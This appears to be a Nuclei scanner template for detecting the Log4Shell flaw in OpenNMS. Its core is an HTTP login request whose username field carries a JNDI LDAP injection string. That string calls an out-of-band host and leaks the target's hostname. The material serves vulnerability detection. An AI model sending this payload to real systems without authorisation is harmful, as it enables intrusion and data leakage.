# Nuclei Template: OpenNMS - JNDI Remote Code Execution (Apache Log4j)
**Template ID:** opennms-log4j-rce
**Vulnerability Class:** Command Injection - Generic
**Severity:** Critical
**CWE:** CWE-77
**Source:** Nuclei Template (`opennms-log4j-rce.yaml`)

## Vulnerability Information & PoC

## Description
OpenNMS JNDI is susceptible to remote code execution via Apache Log4j 2.14.1 and before. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.

## Steps to reproduce / Exploit Payload
```http
POST /opennms/j_spring_security_check HTTP/1.1
Referer: {{RootURL}}/opennms/login.jsp
Content-Type: application/x-www-form-urlencoded

j_username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.postdata.{{interactsh-url}}}&j_password=password&Login=&j_usergroups=
```

## References
- https://www.horizon3.ai/the-long-tail-of-log4shell-exploitation/
- https://www.opennms.com/en/blog/2021-12-10-opennms-products-affected-by-apache-log4j-vulnerability-cve-2021-44228/
- https://logging.apache.org/log4j/2.x/security.html
- https://nvd.nist.gov/vuln/detail/CVE-2021-44228
